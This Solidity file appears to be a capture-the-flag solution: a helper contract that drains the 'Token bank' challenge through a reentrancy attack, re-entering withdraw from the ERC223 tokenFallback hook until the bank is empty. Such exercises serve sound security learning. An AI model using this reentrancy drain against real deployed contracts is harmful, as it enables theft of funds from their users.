// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract ISimpleERC223Token {
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value) external virtual returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external virtual view returns (bool);
    function withdraw(uint256 amount) external virtual;
}

/// @title The challenge helper
/// @author kyrers
/// @notice This contract will drain the Token bank by using the reentrency attack
contract TokenBankHelper {
    ITokenBankChallenge challengeBank;

    /// @notice The constructor that creates our interface
    /// @param tokenBankChallengeAddress The challenge address
    constructor(address tokenBankChallengeAddress) {
        challengeBank = ITokenBankChallenge(tokenBankChallengeAddress);
    }

    /// @notice Deposit our funds in the bank
    /// @dev The bank fallback function handles our deposit
    function deposit() external {
        uint256 ourBalance = challengeBank.token().balanceOf(address(this));

        // If you are not understanding why this works, check the bank fallback function
        challengeBank.token().transfer(address(challengeBank), ourBalance);
    }

    /// @notice Launch the attack
    function launchAttack() external payable {
        withdraw();

        require(challengeBank.isComplete(), "Failed to drain the bank");
    }

    /// @notice The withdraw function that will handle the 
    /// @dev This contains the logic for the reentrancy attack to work. It's pretty simple.
    function withdraw() public {
        uint256 ourBalance = challengeBank.balanceOf(address(this));
        uint256 bankBalance = challengeBank.token().balanceOf(address(challengeBank));

        if (bankBalance > 0) {
            challengeBank.withdraw(ourBalance < bankBalance ? ourBalance : bankBalance);
        }
    }
    
    /// @notice The fallback function that will be called by the token contract
    /// @dev It's important to ignore our initial transfer, otherwise we wouldn't be able to deposit the funds in the bank.
    function tokenFallback(address from, uint256 value, bytes calldata) external {
        // If it wasn't the bank sending funds, it means that it was our initial transfer
        if (from != address(challengeBank)) return;

        withdraw();
    }
}